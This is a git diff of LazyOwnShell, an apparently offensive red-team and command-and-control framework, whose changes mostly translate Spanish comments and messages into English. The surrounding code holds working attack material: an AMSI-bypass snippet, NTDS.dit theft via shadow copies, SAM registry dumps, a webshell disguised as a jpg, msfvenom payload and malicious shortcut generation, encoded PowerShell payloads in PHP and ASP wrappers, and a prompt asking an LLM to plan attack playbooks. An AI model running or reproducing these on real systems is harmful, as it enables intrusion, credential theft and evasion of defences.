@@ -897,7 +897,7 @@ class LazyOwnShell(cmd2.Cmd):
                 'c2_pass': self.params.get('c2_pass', ''),
                 'start_user': self.params.get('start_user', ''),
                 'start_pass': self.params.get('start_pass', ''),
-                # Añade más según necesites
+                # Add more as needed
             }
 
             try:
@@ -1205,7 +1205,7 @@ class LazyOwnShell(cmd2.Cmd):
             except Exception as e:
                 self.display_toastr(f"Error reading YAML  {command_name}: {e}", type="error")
 
-        wrapper.__doc__ = description if description else f"Ejecuta el comando Lua '{command_name}'."
+        wrapper.__doc__ = description if description else f"Execute the Lua command '{command_name}'."
         setattr(self, f'do_{command_name}', wrapper)
         print_msg(f"Command '{command_name}' register from Lua.")
 
@@ -1431,7 +1431,7 @@ class LazyOwnShell(cmd2.Cmd):
         terminal_width = terminal_size.width
         clean_message = message.strip()
         if not clean_message:
-            clean_message = "Mensaje vacío"
+            clean_message = "Empty message"
 
         lines = clean_message.split('\n')
         max_line_length = max(len(line) for line in lines)
@@ -5255,7 +5255,7 @@ class LazyOwnShell(cmd2.Cmd):
                                 "state": 'active'
                             })
                     else:
-                        print_error("No se encontró el TTL en la salida del ping")
+                        print_error("TTL not found in ping output")
                         os_json.append({
                             "id": '4',
                             "os": 'Unknown',
@@ -5263,7 +5263,7 @@ class LazyOwnShell(cmd2.Cmd):
                             "state": 'inactive'
                         })
                 except ValueError:
-                    print_error("No se pudo convertir el TTL a un número entero")
+                    print_error("Could not convert TTL to an integer")
             else:
                 print_error("No se pudo realizar el ping al host")
             print_msg(f"Done... ping -c 1 {rhost} ")
@@ -5755,7 +5755,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
 
-        print_msg("Ejecutando Lazy Proxy ...")
+        print_msg("Running Lazy Proxy ...")
         self.cmd(f"python3 modules/lazyproxy.py")
         print_msg(
             f"{YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}"
@@ -5795,7 +5795,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         path = os.getcwd()
         sessions = f"{path}/sessions"
-        print_msg("Creando la shell disfrazada de jpg")
+        print_msg("Creating shell disguised as jpg")
         self.cmd("python3 modules/lazycreate_webshell.py")
         self.cmd(
             "cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php"
@@ -6013,10 +6013,10 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         if not line.strip():
-            print_error("El valor del hash no puede estar vacío.")
+            print_error("Hash value cannot be empty.")
             return
 
-        print_msg(f"Creando archivo sessions/hash.txt con el siguiente contenido: {line}{RESET}")
+        print_msg(f"Creating file sessions/hash.txt with content: {line}{RESET}")
         hash_file_path = 'sessions/hash.txt'
         if os.path.exists(hash_file_path):
             backup_file_path = f'sessions/hash_{int(time.time())}.txt'
@@ -6125,7 +6125,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         print_msg(
-            f"Creando archivo sessions/cookie.txt con el siguiente contenido {line}{RESET}"
+            f"Creating file sessions/cookie.txt with content {line}{RESET}"
         )
 
         match = re.search(r"cookie=([^&]+)", line)
@@ -6136,7 +6136,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Archivo creado con el contenido: {cookie_value}")
         else:
             print_error(
-                f"El formato de entrada es incorrecto. Asegúrate de que el formato sea: cookie=user_data=valor_base64  {line}{RESET}"
+                f"Input format is incorrect. Make sure the format is: cookie=user_data=base64_value  {line}{RESET}"
             )
             return
 
@@ -7510,7 +7510,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
             ("WIN Disable AMSI", "$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') \\n $AmsiInitFailed = $AmsiUtils.GetField('amsiInitFailed', 'NonPublic,Static') \\n $AmsiInitFailed.SetValue($null,$true)"),
-            ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
+            ("WIN Create Snapshot:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
             ("WIN copy sam1", "reg.exe save hklm\\sam C:\\sam.save"),
             ("WIN copy sam2", "reg.exe save hklm\\system C:\\system.save"),
             ("WIN copy sam3", "reg.exe save hklm\\security C:\\security.save"),
@@ -7923,10 +7923,10 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         cmd = """
-        # Obtiene la fecha y hora actual en el formato deseado
+        # Gets current date and time in desired format
         current_date=$(date +"%Y-%m-%d")
         current_time=$(date +"%H:%M:%S")
-        # Muestra la fecha y hora con figlet
+        # Displays date and time with figlet
         figlet "$current_date"  | lolcat
         figlet "$current_time"  | lolcat
         """
@@ -8849,12 +8849,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         command = """        #!/bin/bash
         ip="{rhost}"
-        echo "Escaneo de puertos abiertos en curso..."
+        echo "Open port scan in progress..."
         echo " "
 
         # Realiza un bucle a través de todos los puertos y verifica si están abiertos
         for port in $(seq 0 65535); do
-            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Puerto $port abierto"
+            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Port $port open"
         done
         """.replace('        ','').replace('{rhost}',rhost)
         print_msg(command)
@@ -8911,14 +8911,14 @@ class LazyOwnShell(cmd2.Cmd):
 
         command = """        #!/bin/bash
         ip="{rhost}"
-        echo "Escaneo de puertos y servicios abiertos en curso..."
+        echo "Open port and service scan in progress..."
         echo " "
 
         # Realiza un bucle a través de todos los puertos y verifica si están abiertos
         for port in $(seq 0 65535); do
             (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && {
                 service=$(echo "$(sudo lsof -i :$port)" | awk 'NR==2{print $1}')
-                [ -n "$service" ] && echo "Puerto $port abierto - Servicio: $service"
+                [ -n "$service" ] && echo "Port $port open - Service: $service"
             }
         done
         """.replace('        ','').replace('{rhost}',rhost)
@@ -10105,7 +10105,7 @@ class LazyOwnShell(cmd2.Cmd):
         elif payload_type == '3':
             command = input("    [!] Enter personalized command (default: whoami): ") or 'whoami'
         else:
-            print_error(f"Tipo de payload no válido: {payload_type}")
+            print_error(f"Invalid payload type: {payload_type}")
             return
 
         output_type = input("    [!] Tipo de salida (1: PowerShell, 2: ASP, 3: PHP): ").strip()
@@ -10120,7 +10120,7 @@ class LazyOwnShell(cmd2.Cmd):
         elif output_type == '3':
             final_command = f"<?php system(`powershell /enc {base64_command}`); ?>"
         else:
-            print_error(f"Tipo de salida no válido: {output_type}")
+            print_error(f"Invalid output type: {output_type}")
             return
         choice = input("   [?] Do you wanna see more payloads (y/n)") or "n"
         if choice == "y":
@@ -10202,7 +10202,7 @@ class LazyOwnShell(cmd2.Cmd):
         utf16le_encoded = cmd.encode("utf-16le")
         # Codifica el resultado en base64
         base64_encoded = base64.b64encode(utf16le_encoded)
-        # Convierte el resultado a una cadena y elimina el salto de línea final
+        # Convert the result to a string and remove the trailing newline
         base64_string = base64_encoded.decode("utf-8").strip()
         cmdd = f"""powershell -e {base64_string}"""
         self.cmd(f'printf "{cmdd}" | xclip -sel clip')
@@ -10529,10 +10529,10 @@ class LazyOwnShell(cmd2.Cmd):
             set RHOSTS {TARGET_IP}
             run
 
-            # Buscar módulos de explotación de vulnerabilidades
+            # Search vulnerability exploitation modules
             search ms17_010
 
-            # Terminar la sesión
+            # Terminate session
             exit
             """)
 
@@ -10673,7 +10673,7 @@ class LazyOwnShell(cmd2.Cmd):
                 payload_path = os.path.join(web_root, "payload.exe")
                 msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                 subprocess.run(msfvenom_cmd, shell=True, check=True)
-                print_msg("Payload creado con éxito en: " + payload_path)
+                print_msg("Payload created successfully at: " + payload_path)
 
                 xml_content = f"""<?xml version="1.0"?>
                 <job>
@@ -10686,8 +10686,8 @@ class LazyOwnShell(cmd2.Cmd):
                 xml_path = os.path.join(web_root, "download_payload.xml")
                 with open(xml_path, "w") as xml_file:
                     xml_file.write(xml_content)
-                print_msg("Archivo XML creado con éxito en " + xml_path)
-                print_msg(f"Asegúrate de que el payload esté en: {payload}")
+                print_msg("XML file created successfully at " + xml_path)
+                print_msg(f"Make sure the payload is at: {payload}")
                 ps_script_content = f"""
                 $WshShell = New-Object -ComObject WScript.Shell
                 $Shortcut = $WshShell.CreateShortcut("c:\\Common Applications\\Calculator.lnk")
@@ -10700,7 +10700,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                 print_msg(f"Script de PowerShell creado en {ps_script_path}")
                 print_msg(
-                    "Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:"
+                    "Run this script on the Windows machine to create the .lnk file:"
                 )
                 print(ps_script_content)
 
@@ -10869,19 +10869,19 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(scanning_category)
     def do_sessionssh(self, line):
         """
-        Ejecuta un comando para listar las conexiones SSH activas.
+        Execute a command to list active SSH connections.
 
-        Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH.
+        This method uses `netstat` to display established (`ESTAB`) connections and filters the results to show only SSH connections.
 
-        Parámetros:
-        - line: Parámetro no utilizado en esta función.
+        Parameters:
+        - line: Unused parameter in this function.
 
         Returns:
         - None
 
-        Ejemplos:
+        Examples:
         >>> do_sessionssh("")
-        (Muestra en consola las conexiones SSH activas)
+        (Displays active SSH connections in the console)
         """
 
         command = "netstat -putan |grep -i estab| grep ssh"
@@ -10976,24 +10976,22 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(lateral_movement_category)
     def do_set_proxychains(self, line):
         """
-        Relanza la aplicación actual utilizando `proxychains` para enrutar el tráfico
-        a través de los proxies configurados.
+        Restart the current application using `proxychains` to route traffic
+        through the configured proxies.
 
-        Este comando reinicia la aplicación desde el principio utilizando un script
-        bash externo llamado `run`, que se encarga de configurar el entorno
-        (como activar un entorno virtual) y luego ejecutar la aplicación Python.
-        El comando `proxychains` se utiliza para asegurar que cualquier comando
-        ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través
-        de los proxies especificados en la configuración de `proxychains`.
+        This command restarts the application from scratch using an external
+        bash script called `run`, which sets up the environment
+        (such as activating a virtual environment) and then runs the Python application.
+        The `proxychains` command ensures that any command executed within the application,
+        such as `nmap`, is routed through the proxies specified in the `proxychains` configuration.
 
-        Pasos realizados por esta función:
-        1. Obtiene la ruta al script `run`.
-        2. Relanza el script `run` bajo `proxychains` utilizando `subprocess.run`.
-        3. Sale de la instancia actual de la aplicación para evitar duplicación.
+        Steps performed by this function:
+        1. Gets the path to the `run` script.
+        2. Restarts the `run` script under `proxychains` using `subprocess.run`.
+        3. Exits the current application instance to avoid duplication.
 
         Args:
-            line (str): No se utiliza en este comando, pero se incluye como parte
-                        de la interfaz estándar de `cmd`.
+            line (str): Not used by this command, but included as part of the standard `cmd` interface.
         """
         print_msg("Restarting with proxychains...")
         run_script_path = "run"
@@ -11669,7 +11667,7 @@ class LazyOwnShell(cmd2.Cmd):
                 $response.OutputStream.Close()
             }
         } catch {
-            Write-Host "Ocurrió un error: $_"
+            Write-Host "An error occurred: $_"
         } finally {
             $listener.Stop()
         }
@@ -12100,13 +12098,13 @@ class LazyOwnShell(cmd2.Cmd):
         - do_bsqli(None, None)
         """
 
-        # Solicitar parámetros al usuario
+        # Request parameters from the user
         url = input("Enter the URL (e.g., http://example.com/page.php): ")
         db = input("Enter the name of the database: ")
         table = input("Enter the name of the table: ")
         col = input("Enter the column names separated by commas (e.g., username,password): ")
 
-        # Preparar el comando para ejecutar el script con los parámetros proporcionados
+        # Prepare the command to run the script with the provided parameters
         command = [
             'python3', 'modules/lazysqli.py',
             '--url', url,
@@ -13318,7 +13316,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         elif line.startswith("hash"):
             if not os.path.exists(hash_txt):
-                print_error(f"No se encontró {hash_txt}.")
+                print_error(f"{hash_txt} not found.")
                 return
             hash_txt = get_hash()
             if not hash_txt:
@@ -15857,7 +15855,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Todos los usuarios se han agregado a {user_file}.")
 
         except json.JSONDecodeError:
-            print_error(f"Error: No se pudo decodificar el archivo {json_file}. Asegúrate de que sea un JSON válido.")
+            print_error(f"Error: Could not decode {json_file}. Make sure it is valid JSON.")
         except Exception as e:
             print_error(f"Error: {str(e)}")
 
@@ -16137,15 +16135,15 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"{idx}: {video}")
 
 
-            choice = input("Elige el número del video que deseas decodificar: ")
+            choice = input("Choose the number of the video you want to decode: ")
             try:
                 choice = int(choice)
                 if 1 <= choice <= len(video_files):
                     video_file = video_files[choice - 1]
                 else:
-                    print_error("Elección no válida.")
+                    print_error("Invalid choice.")
             except ValueError:
-                print_error("Por favor, ingresa un número válido.")
+                print_error("Please enter a valid number.")
 
             path = os.getcwd()
             video_full_path = f"{path}/sessions/{video_file}"
@@ -16182,7 +16180,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         try:
             result = subprocess.run(command, check=True)
-            print_msg("Comando ejecutado con éxito: ".join(command))
+            print_msg("Command executed successfully: ".join(command))
         except subprocess.CalledProcessError as e:
             print_error(f"Error al ejecutar el comando: {e}")
 
@@ -16198,15 +16196,15 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(f"{idx}: {video}")
 
 
-            choice = input("Elige el número del video que deseas decodificar: ")
+            choice = input("Choose the number of the video you want to decode: ")
             try:
                 choice = int(choice)
                 if 1 <= choice <= len(video_files):
                     self.do_evidence(video_files[choice - 1])
                 else:
-                    print_error("Elección no válida.")
+                    print_error("Invalid choice.")
             except ValueError:
-                print_error("Por favor, ingresa un número válido.")
+                print_error("Please enter a valid number.")
 
         return
 
@@ -20441,6 +20439,17 @@ class LazyOwnShell(cmd2.Cmd):
 
     @cmd2.with_category(scanning_category)
     def do_certipy_ad(self, line):
+        """Run certipy-ad against Active Directory Certificate Services.
+
+        Supports shadow, vuln, find, account, and auth subcommands.
+        Requires rhost, domain, and credentials in payload.json.
+
+        Args:
+            line (str): Subcommand to run (shadow | vuln | find | account | auth).
+
+        Returns:
+            None
+        """
         target = self.params["rhost"]
         domain = self.params["domain"]
         subdomain = self.params["subdomain"]
@@ -23537,7 +23546,7 @@ class LazyOwnShell(cmd2.Cmd):
             payload = {
                 "jsonrpc": "2.0",
                 "method": "eth_getLogs",
-                "params": [{"address": "0x75e41404c8c1de0c2ec801f06fbf5ace8662240f"}],  # Dirección del contrato inteligente
+                "params": [{"address": "0x75e41404c8c1de0c2ec801f06fbf5ace8662240f"}],  # Smart contract address
                 "id": 1
             }
             print_msg(payload)
@@ -25481,10 +25490,10 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(post_exploitation_category)
     def do_atomic_lazyown(self, line):
         """
-        Genera y ejecuta pruebas de Atomic Red Team usando el C2.
+        Generate and execute Atomic Red Team tests using the C2.
 
         Parameters:
-        line (str): Lista de IDs de técnicas separadas por espacios.
+        line (str): List of technique IDs separated by spaces.
 
         Returns:
         None
@@ -25727,12 +25736,12 @@ class LazyOwnShell(cmd2.Cmd):
             print(f"Auth: {self.c2_auth}")
             print(f"Data: {data}")
 
-            # Envía la solicitud HTTPS (ignora errores de certificado con verify=False)
+            # Send the HTTPS request (ignore certificate errors with verify=False)
             response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
-            response.raise_for_status()  # Lanza una excepción si el código de estado no es 200
+            response.raise_for_status()  # Raise an exception if the status code is not 200
             print_msg(f"Command '{command}' issued successfully.")
         except ConnectionError as e:
-            print_error(f"Error de conexión: {e}")
+            print_error(f"Connection error: {e}")
         except RequestException as e:
             print_error(f"Error en la solicitud: {e}")
         except Exception as e:
@@ -26535,7 +26544,7 @@ class LazyOwnShell(cmd2.Cmd):
                     session_data["credentials"].append({
                         "usuario": i,
                         "username": username,
-                        "contraseña": password
+                        "password": password
                     })
         hash_files = glob.glob(os.path.join(sessions, 'hash*.txt'))
         for i, file in enumerate(hash_files, start=1):
@@ -26912,12 +26921,12 @@ class LazyOwnShell(cmd2.Cmd):
         """
         ip = line.strip()
         if not ip:
-            print_error("Error: Por favor, proporciona una dirección IP.")
+            print_error("Error: Please provide an IP address.")
             return
 
         data = query_arin_ip(ip)
         if not data:
-            print_error(f"No se encontró información para la IP: {ip}")
+            print_error(f"No information found for IP: {ip}")
             return
 
         if not data.get("net"):
@@ -27720,7 +27729,7 @@ class LazyOwnShell(cmd2.Cmd):
 
 
     def get_available_actions(self):
-        """Devuelve una lista de acciones disponibles usando introspección de cmd2."""
+        """Returns a list of available actions using cmd2 introspection."""
         # Usa get_all_commands() para obtener todos los comandos definidos como do_*
         return self.get_all_commands()
 
@@ -27760,7 +27769,7 @@ class LazyOwnShell(cmd2.Cmd):
         try:
             path = line.encode('ascii') + b'\x00'
             total_len = len(path)
-            padded_len = ((total_len + 7) // 8) * 8  # Alinear a múltiplo de 8
+            padded_len = ((total_len + 7) // 8) * 8  # Align to multiple of 8
             padded = path.ljust(padded_len, b'/')
 
             chunks = [padded[i:i+8] for i in range(0, padded_len, 8)]
@@ -27978,7 +27987,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Create a prompt that strictly enforces YAML response format without any narrative text
         """
-        # Contexto dinámico del CSV
+        # Dynamic CSV context
         nmap_context = "Services detected during reconnaissance:\n"
         for service, instances in nmap_services.items():
             nmap_context += f"- {service}\n"
@@ -28011,7 +28020,7 @@ class LazyOwnShell(cmd2.Cmd):
             mitre_id: T1190
             mitre_name: Exploit Public-Facing Application""".replace("        ","")
 
-        # Construir el prompt final con instrucciones YAML explícitas
+        # Build the final prompt with explicit YAML instructions
         return f"""
         You are a red team planner tasked with creating ATTACK PLAYBOOKS in YAML format.
 
